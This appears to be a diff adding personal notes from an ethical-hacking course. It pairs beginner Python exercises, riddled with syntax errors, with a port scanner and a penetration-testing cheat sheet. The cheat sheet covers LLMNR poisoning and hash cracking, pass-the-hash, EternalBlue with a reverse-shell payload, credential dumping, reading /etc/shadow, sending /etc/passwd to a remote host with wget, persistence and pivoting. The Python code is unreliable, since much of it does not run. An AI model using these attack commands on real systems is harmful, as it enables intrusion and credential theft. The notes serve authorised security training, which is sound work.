@@ -1,0 +1,689 @@
+#!/usr/bin/python
+###!/bin/python3
+
+##FULL ETHICAL HACKING YOUTUBE VIDEO
+##PYTHON LEARNING
+##https://www.youtube.com/watch?v=3Kq1MIfTWCE
+##012120
+
+#==
+#VARS AND METHODS
+#==
+
+print("fun with vars and methods:")
+quote = "all is fair in love and war"
+print(len(quote)) #length
+print(quote.upper()) #uppercase
+print(quote.lower()) #lowercase
+print(quote.title()) #title
+
+print('\n') #newline
+
+name = "Heath"
+age = 29 #int OR int(29)
+gpa = 3.7 #float #float(3.7)
+
+print(int(age())
+print(int(29.9)) #does not round - would think would round up, but doesnt
+
+print("My name is " + name + " and I am " + str (age) + " years old")
+#need to convert int to string, cannot print int in string
+
+print('\n') #newline
+
+age = += 1
+print (age)
+
+#prints 30
+
+birthday = 1
+age += birthday
+print(age)
+
+#==
+#FUNCTIONS
+#==
+
+print("Now, some functions:")
+def who_am_i():
+        name1 = "Heath" ##one tab is needed here
+        age = 29
+        print ("My name is " + name1 + " and I am " + str (age) + " years old")
+
+who_am_i()
+
+print(name1) ##get not defined because var is in function, only local var available to function
+
+#==
+
+#ADDING PARAMETERS
+def add_one_hundred(num):
+	print(num + 100)
+
+add_one_hundred(100)
+
+#ADDING MULTIPLE PARAMETERS
+def add(x,y):
+	print(x + y)
+	
+add(7,7)
+add(305,207)
+
+#==
+#USING RETURN
+#==
+
+def multiply(x,y)
+	return x * y
+	
+print(multiply(7,7))
+
+def square_root(x):
+	return x ** .5
+	
+print(square_root(64))
+
+print('\n') #newline
+
+#==
+##BOOLEAN EXPRESSIONS - True or False
+#==
+
+bool1 = True
+bool2 = 3*3 == 9
+bool3 = False
+bool4 = 3*3 != 9
+
+print(bool1,bool2,bool3,bool4)
+print(type(bool1)) #<class 'bool'>
+
+bool5 = "True"
+print(type(bool5))
+
+#==
+#RELATIONAL AND BOOLEAN OPERATORS
+#==
+
+greater_than = 7 > 5
+less_than = 5 < 7
+greater_than_equal_to = 7 >= 7
+less_than_equal_to = 7 <= 7
+
+print(greater_than,less_than,greater_than_equal_to,less_than_equal_to)
+
+test_and = (7 > 5) and (5 < 7)
+test_or = (7 > 5) or (5 < 7)
+test_not = not True
+
+print(test_and,test_or,test_not)
+
+print('\n') #newline
+
+#==
+#CONDITIONAL STATEMENTS
+#==
+
+print("Conditional Statements")
+
+def soda(money):
+	if money >= 2:
+		return "You've got yourself a soda!"
+	else:
+		return "No soda for you!"
+print(soda(3))
+print(soda(1))
+
+def alcohol(age,money)
+	if (age >= 21) and (money >= 5:
+		return "We're gettin' tipsy!"
+	elif (age >= 21) and (money <5 ):
+		return "Come back with more money."
+	elif (age < 21) and (money >= 5):
+		return "Nice try kid."
+	else:
+		return "You're too poor and too young."
+		
+print(alcohol(21,5))
+print(alcohol(21,4))
+print(alcohol(20,4))
+
+print('\n') #newline
+
+#==
+#LISTS
+#==
+
+print("Lists have brackets:")
+
+movies = ["When Harry Met Sally", "The Hangover", "The Perks of Being a Wallflower", "The Exorcist"]
+
+print(movies[1]) #prints movie number 2
+print(moveis[0:2]) #prints 1 and 2, up to, not including
+print(movies[1:])
+print(movies[:1])
+print(movies[-1]) #last item in list
+print(len(movies))
+
+movies.append("JAWS) #adds to end of list
+movies.pop() #removes last element from list
+movies.pop(1) #removes second item in list
+
+movies = ["When Harry Met Sally", "The Hangover", "The Perks of Being a Wallflower", "The Exorcist"]
+person = ("Heath", "Jake", "Leah", "Jeff")
+combined = zip(movies, person)
+print(list(combined)) #pairs lists together
+
+##Tuples
+print("Tuples have parentheses and cannot change")
+grades = ("A", "B", "C", "D", "F")
+print(grades([1])
+
+#==
+#LOOPING
+#==
+
+print("For loops - start to finish of iterate:")
+
+vegetables = ["cucumber", "spinach", "cabbage"]
+for x in vegetables:
+	print(x)
+	
+print("While loops = execute as long as True:"
+
+i = 1
+while i < 10
+	print(i)
+	i += 1
+	
+#==
+#IMPORTING
+#==
+
+print("Importing is important:")
+
+import sys ##system functions and parameters
+
+from datetime import datetime
+print(datetime.now())
+from datetime import datetime as dt ##importing with alias
+
+def newline():
+	print('\n')
+	
+newline()
+
+#==
+#ADVANCED STRINGS
+#==
+
+print("Advanced strings:")
+my_name = "Heath"
+print(my_name[0]) #first letter
+print(my_name[-1]) #last letter
+
+sentence = "This is a sentence."
+print(sentence[:4]) #first word
+print(sentence[-9:-1]) #last word
+
+print(sentence.split()) #split sentence by delimiter (space)
+
+sentence_split = sentence_split()
+sentence_join= ' '.join(sentence_split)
+print(sentence_join)
+print('\n'.join(sentence_split))
+
+quoteception = "I said, 'give me all the money'"
+print(quoteception)
+
+quoteception = "I said, \"give me all the money\""
+print(quoteception)
+
+print("A" in "Apple") ##returns True
+
+letter = "A"
+word = "Apple"
+
+print(letter.lower() in word.lower()) #True #case insensitive
+
+word_two = "Bingo"
+print((letter.lower() in word.lower()) and not (letter.lower() in word_two.lower()))
+
+too_much_space = "                 hello                  "
+print(too_much_space.strip())
+
+full_name = "eath Adams"
+print(full_name.replace("eath", "Heath))
+full_name.find("Adams")
+
+#==
+#PLACEHOLDERS
+#==
+
+movie = "The Hangover"
+print("My faviourite movie is {}.".format(movie())
+
+def favorite_book(title, author):
+	fav = "My favorite book is \"{}\", which is written by {}.".format(title, author)
+	return fav
+	
+print(favorite_book("The Great Gatsby","F. Scott Fitzgerald"))
+
+newline()
+
+#==
+#DICTIONARIES
+#==
+
+print("DICTIONARIES are keys and values:")
+drinks {"White Russians":7,"Old Fashioned": 10, "Lemon Drop": 8, "Buttery Nipple":6} #drink is key, price is value
+print(drinks)
+
+employees = {"Finance": ["Bob", "Linda", "Tina"], "IT": ["Gene", "Louise", "Teddy"], "HR": [Jimmy Jr.", "Mort"]}
+print(employees)
+
+employees['Legal'] = ['Mr. Frond'] #add new key: value pair
+print(employees)
+
+employees.update{{"Sales": ["Andie", "Ollie"}}
+print(employees)
+
+drinks['White Russians'] = 8
+print(drinks)
+
+print(drinks.get('White Russians'))
+print(drinks.get('Martini'))
+print(drinks.get['White Russians'])
+
+#==
+#LISTS AND DICTIONARIES
+#==
+
+movies = ["When Harry Met Sally", "The Hangover", "The Perks of Being a Wallflower", "The Exorcist"]
+person = ("Heath", "Jake", "Leah", "Jeff")
+
+combined - zip (movies, person)
+movie_dictionary - {key: value for key, value in combined}
+
+print(movie_dictionary)
+
+#==
+#SIMPLE HTTP SERVER - PYTHON
+#==
+
+python -m SimpleHTTPServer 80
+
+##PYTHON3
+python3 -m http.server 80
+
+#==
+##PYTHON FTP SERVER
+#==
+pip install pyftpdlib
+python3 -m pyftpdlib -p 21 -w
+
+#==
+##PORT SCANNER BUILD - VERY BASIC, NOT GREAT - MEANT TO BE THIS WAY
+#==
+
+#!/bin/python3
+
+import sys
+import socket
+from datetime import datetime
+
+#DEFINE TARGET
+#python3 scanner.py <ip>
+
+if len(sys.argv) == 2:
+	target = socket.gethostbyname(sys.argv[1]) #TRANSLATE A HOSTNAME TO IPV4
+else:
+	print("Inavlid amount of arguments.")
+	print("Syntax: python3 scannner.py <ip>")
+	sys.exit()
+
+#add pretty banner
+print("-" * 50)
+print("Scanning target "+target)
+print(Time started: "+str(datetime.now()))
+print("-" * 50)
+
+try:
+	for port in range(50,85):
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM
+		socket.setdefaulttimeout(1) ##is a float
+		result = s.connect_ex((target,port))  ##returns error indicator
+		print("Checking port {}".format(port))
+		if result == 0:
+			print("Port {} is open.format(port))
+		s.close()
+		
+except KeyboardInterupt
+	print("\nExiting program.")
+	sys.exit()
+	
+except socket.gaierror
+	print("Hostname could not be resolved.")
+	sys.exit()
+	
+except socket.error
+	print("Could not connect to the server.")
+	sys.exit()
+	
+	
+#==
+##PORT SCANNER BUILD - END
+#==
+
+#==
+##5 STAGES OF HACKING
+#==
+
+recon - passive, active
+scanning and enumeration
+gaining access
+maintaining access
+covering tracks
+
+==
+passive - osint
+==
+physical, social - satellite images, building layout
+job info - employee, pictures, badges
+whois, nslookip, dns-recon, dig
+sublis3r, bluto
+fingerprinting - nmap, wappalyzer, whatweb, builtwith, netcat
+
+bugcrowd.com
+hunter.io - checks for email and domain
+theharvester
+crt.sh
+hackerone
+builtwith.com
+
+bluto - good tool checks haveibeenpwnd
+pip install bluto
+
+#==
+#TCP 3 WAY HANDSHAKE
+#==
+
+SYN
+SYN ACK
+ACK
+
+SCANNING DOES
+
+SYN
+SYN ACK
+RST - RESET
+
+NMAP PING SWEEP FIRST
+nmap -sn ip/mask
+
+nmap -T4 ip/mask - scan speed - 1 - 5 fastest
+
+nmap -T4 -A -p- ip - teachers' (heath) regular method - he says does all ports
+
+stage scanning - means scan quick and high then do intense scan with results
+
+nmap -oA file - outputs to format in file
+
+arrow up for status of scan
+
+==
+UDP SCANNING
+==
+
+nmap -sU -T4 ip
+
+SCANNING ALL UDP PORTS WILL TAKE A LONG LONG TIME
+
+ls /usr/share/nmap/scripts
+
+nmap -p 443 --script=all ##will run all scripts in folder
+
+nmap -p 443 --script=ssl-enum-ciphers domain ##check ciphers
+
+==
+NESSUS SCAN, there is limited free version
+==
+
+==
+METASPLOIT
+==
+
+auxiliary model is scanning/enum
+exploit model is to exploit
+post exploit model is after we have a session
+
+==
+NIKTO WEB SCANNER
+==
+
+nikto -h https://url.com
+
+##hackthebox.eu
+
+##kioptrix
+
+project organizer?
+keepnote?
+
+netdiscover -r ip/24
+
+owasp dirbuster
+when do search use file extensions: php, asa, sql, zip, tar, pdf, txt, bak
+
+kali word list - /usr/share/wordlists/dirbuster
+
+==
+check all you can, dig as deep as you can
+when reporting, be very detailed
+pretty reports seem important
+==
+
+==
+SEARCHSPLOIT
+==
+
+searchsploit apache 1.3.20
+searchsploit apache 1.3
+searchsploit ssh
+
+==
+
+smbclient -L \\\\ip
+
+==
+
+==
+POST EXPLOIT
+==
+
+arp -a
+route
+sudo -l
+pwd
+netstat
+
+cat /etc/shadow
+cat /etc/passwd
+
+==
+SMB ATTACKS
+LLMNR/NBT-NS POSIONING
+==
+responder
+run in morning when users are logging in or lunch to get the most hashes
+==
+
+cd /usr/share/responder
+python Responder.py -I eth0 -rdw
+
+GET HASH FROM RESPONDER
+
+hashcat -m 5600 hash.txt wordlist.txt --force
+
+john the ripper
+
+==
+DEFENSES AGAINST SMB ATTACKS
+==
+
+DISABLE LLMNR - TURN OFF MULTICAST NAME RESOLUTION
+DISABLE NBT-NS - IN NIC SETTINGS, DISABLE NETBIOS OVER TCP/IP
+REQUIRE NETWORK ACCESS CONTROL
+REQUIRE STRONG PASSWORDS, >12
+
+
+WINDOWS NON AD PRIVILEGE ESCALATIONS
+https://www.fuzzysecurity.com/tutorials/16.html
+
+LINUX PRIVILEGE ESCALATIONS
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+
+ADVANCED AD
+adsecurity.org
+
+pentesteracademy.com
+hackthebox.eu
+
+==
+
+crackmapexec
+crackmapexec smb ip/sub -u Administrator -p 'pass' -d domain
+crackmapexec smb ip/sub -u Administrator -h PASS HASH
+
+metasploit
+use exploit/windows/smb/psexec
+show targets, try all
+
+==
+POST
+==
+
+getuid
+sysinfo
+ps
+
+check arch x86 64
+migrate pid
+
+meterpreter help
+
+getsystem - get system as admin
+
+load incognito
+
+delegate_token - pyhsical login, rdp
+impersinate_token - network drive, or task sked
+
+##A WAY TO DUMP CREDS
+load kiwi
+creds all
+
+##SWITCH BACK TO FIRST USER
+rev2self
+
+##BACKGROUND METASPLOIT SESSION
+background
+
+##COLLECTS A BUNCH OF INFO
+use post/multi/recon/local_exploit_suggester
+
+when in x64 met and target arch x64 can do:
+hashdump
+shell - gets cmd, ps shell
+
+==
+LLMNR RELAY ATTACK - GP MS NETWORK CLIENT SIGNING NEEDS TO BE DISABLED
+==
+
+locate ntlmrelayx.py
+cd /opt/impacket/examples
+##impacket toolkit
+
+python ntlmrelayx.py -tf target.txt smb2support
+
+smbrelay can get a shell
+
+empire
+
+==
+MS17-010, GPP/cPasswords, and KERBEROASTING
+==
+
+use /exploit/windows/smb/ms17_010_eternalblue
+set rhost
+run
+
+##might take a couple times to get it
+##gets to universal shell
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+##SMB DOWNLOAD FILES
+RECURSE ON
+PROMPT OFF
+mget *
+
+GPP
+Groups.xml
+cpassword
+stored in sysvol folder
+
+use/windows/gather/credentials/gpp
+
+gpp-decrypt cpassword
+
+##KERBEROASTING
+IF HAVE VALID TGT THEN CAN REQUEST TGS FOR SPN ON SERVICE
+
+python GetUserSPNs.py domain/user dc-ip ip -request
+
+hashcat
+
+##FILE TRANSFERS
+##linux
+nc -nvlp 8081
+wget --post-file=/etc/passwd ip:port
+
+##windows
+certutil --urlcache -f https://url/file.txt filename.txt
+
+metasploit upload and download ##works well
+
+##METERPRETER PERSISTENCE
+
+run persistence -h ##dangerous, is wide open
+exploit/windows/local/persistence
+exploit/windows/local/registry_persistence
+
+##SCHEDULED TASK
+run scheduleme
+run schtaskabuse
+
+##METSVC
+run metsvc -A
+
+use exploit/multi/handler
+##run reverse tcp as payload, handler
+
+==
+PIVOT
+==
+
+can transition across networks 
+can chain meterpreter sessions
+
+meterpreter run autoroute -s ip/mask
+##add static route
+
+==
+CLEANUP
+==
+
+remove all bad files
+remove accounts
+clean up all mess that was created
+
